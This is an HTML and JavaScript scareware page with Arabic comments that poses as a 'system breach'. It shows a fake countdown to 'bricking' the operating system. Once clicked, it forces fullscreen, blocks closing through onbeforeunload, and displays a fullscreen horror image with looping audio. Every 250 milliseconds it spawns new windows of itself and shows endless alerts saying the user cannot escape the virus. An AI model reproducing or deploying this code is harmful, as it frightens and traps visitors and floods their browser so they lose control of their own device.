<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL_SYSTEM_ERROR</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 20px #f00; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
    </style>
</head>
<body onclick="startBrutalVirus()">

    <div id="terminal">
        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM BREACH DETECTED ⚠️</div>
        <div id="countdown">20</div>
        <div style="color: #0ff;">> OVERRIDING_OS_FILES...<br>> STATUS: BRICKING_CORE...</div>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>

    <script>
        let seconds = 20;
        let active = false;

        // ميزة القفل الحديدي: منع إغلاق المتصفح سواسوة
        window.onbeforeunload = function() {
            return "Error"; 
        };

        // إذا خرج من المتصفح ورجع، الصفحة تعاود تخرج أوتوماتيكياً سواسوة
        document.addEventListener("visibilitychange", function() {
            if (document.visibilityState === 'visible' && active) {
                forceOpen();
            }
        });

        function startBrutalVirus() {
            if (active) return;
            active = true;
            document.documentElement.requestFullscreen().catch(() => {});

            let timer = setInterval(() => {
                seconds--;
                document.getElementById('countdown').innerText = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    doLockdown();
                }
            }, 1000);
        }

        function doLockdown() {
            document.getElementById('terminal').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            forceOpen();
        }

        function forceOpen() {
            let audio = document.getElementById('sfx');
            audio.play(); // الصوت سيبقى يتكرر بفضل loop

            // ميزة اللاق التام لمنع الخروج (إظهار تنبيهات لا تنتهي)
            // هذا الجزء يخلي المتصفح يتبلوكا سواسوة
            setInterval(() => {
                // فتح نوافذ جديدة لملء الخلفية ومنع المسح
                window.open(window.location.href, '_blank');
                if(audio.paused) audio.play();
                alert("⚠️ خطأ قاتل: لا يمكن الخروج من الفيروس سواسوة!");
            }, 250);
        }
    </script>
</body>
</html>
